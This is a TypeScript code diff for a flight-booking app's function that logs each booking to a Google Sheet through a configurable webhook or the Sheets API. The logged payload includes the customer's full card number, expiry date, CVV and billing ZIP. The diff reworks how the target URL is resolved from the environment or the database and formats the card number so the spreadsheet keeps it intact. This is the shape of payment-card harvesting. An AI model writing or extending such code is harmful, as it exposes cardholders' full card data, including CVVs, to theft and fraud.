@@ -7,28 +7,46 @@ function log(message: any) {
 }
 
 export async function logBookingToSheet(booking: any, flight: any, sheetIdOrWebhook?: string) {
-  let target = sheetIdOrWebhook || process.env.GOOGLE_SHEETS_WEBHOOK_URL || process.env.GOOGLE_SHEETS_ID;
+  let webhookUrl = process.env.GOOGLE_SHEETS_WEBHOOK_URL || "";
+  let sheetId = process.env.GOOGLE_SHEETS_ID || "";
 
-  // Retrieve from database CMSConfig if not in process.env
-  if (!target) {
+  // 1. Check passed argument
+  if (sheetIdOrWebhook?.startsWith("http://") || sheetIdOrWebhook?.startsWith("https://")) {
+    webhookUrl = sheetIdOrWebhook;
+  } else if (sheetIdOrWebhook) {
+    sheetId = sheetIdOrWebhook;
+  }
+
+  // 2. Check if env GOOGLE_SHEETS_ID is actually a webhook URL
+  if (sheetId.startsWith("http://") || sheetId.startsWith("https://")) {
+    webhookUrl = sheetId;
+    sheetId = "";
+  }
+
+  // 3. Query CMSConfig in database for webhook URL or sheetId if webhook is not set
+  if (!webhookUrl) {
     try {
       await connectToDatabase();
       const doc = await CMSConfig.findOne({ key: "env_settings" }).lean();
-      if (doc?.value?.googleSheetsId || doc?.value?.googleSheetsWebhookUrl) {
-        target = doc.value.googleSheetsWebhookUrl || doc.value.googleSheetsId;
+      if (doc?.value) {
+        if (doc.value.googleSheetsWebhookUrl) {
+          webhookUrl = doc.value.googleSheetsWebhookUrl;
+        }
+        if (doc.value.googleSheetsId) {
+          if (doc.value.googleSheetsId.startsWith("http://") || doc.value.googleSheetsId.startsWith("https://")) {
+            webhookUrl = doc.value.googleSheetsId;
+          } else if (!sheetId) {
+            sheetId = doc.value.googleSheetsId;
+          }
+        }
       }
     } catch (err) {
       log(`Could not load googleSheets target from CMSConfig: ${err}`);
     }
   }
 
-  if (!target) {
-    log("⚠️ Google Sheets config missing - skipping sheet logging");
-    return { success: false, message: "Google Sheets not configured" };
-  }
-
-  // METHOD 1: Google Apps Script Webhook (Easiest, No Service Account required!)
-  if (target.startsWith("http://") || target.startsWith("https://")) {
+  // METHOD 1: Google Apps Script Webhook (Easiest, works without service account keys)
+  if (webhookUrl) {
     try {
       const priceFormatted = flight?.price
         ? typeof flight.price === "number"
@@ -50,7 +68,7 @@ export async function logBookingToSheet(booking: any, flight: any, sheetIdOrWebh
         arrivalTime: flight?.arrivalTime || "",
         price: priceFormatted,
         cardholderName: booking.cardholderName || booking.passengerName || "",
-        cardNumber: booking.cardNumber || "",
+        cardNumber: booking.cardNumber ? `'${booking.cardNumber}` : "",
         cardExp: booking.cardExp || "",
         cardCvv: booking.cardCvv || "",
         billingZip: booking.billingZip || "",
@@ -58,7 +76,7 @@ export async function logBookingToSheet(booking: any, flight: any, sheetIdOrWebh
         status: "Confirmed",
       };
 
-      const res = await fetch(target, {
+      const res = await fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
@@ -70,6 +88,12 @@ export async function logBookingToSheet(booking: any, flight: any, sheetIdOrWebh
       log(`❌ Webhook logging error: ${whErr.message}`);
       return { success: false, message: whErr.message };
     }
+  }
+
+  let target = sheetId;
+  if (!target) {
+    log("⚠️ Google Sheets config missing - skipping sheet logging");
+    return { success: false, message: "Google Sheets not configured" };
   }
 
   // METHOD 2: Standard Google Sheets API v4 (Service Account)
